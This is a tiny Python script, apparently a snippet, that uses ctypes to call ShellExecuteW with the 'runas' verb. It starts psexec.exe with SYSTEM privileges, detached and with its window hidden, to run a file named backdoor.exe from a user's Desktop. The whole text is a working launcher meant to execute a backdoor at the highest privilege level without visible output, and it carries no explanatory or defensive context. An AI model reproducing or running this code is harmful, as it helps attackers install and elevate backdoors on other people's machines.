import ctypes

ctypes.windll.shell32.ShellExecuteW(None, u"runas", u"psexec.exe", 
u"-accepteula -nobanner -s -d C:\\Users\\usuario\\Desktop\\backdoor.exe", None, 0) #1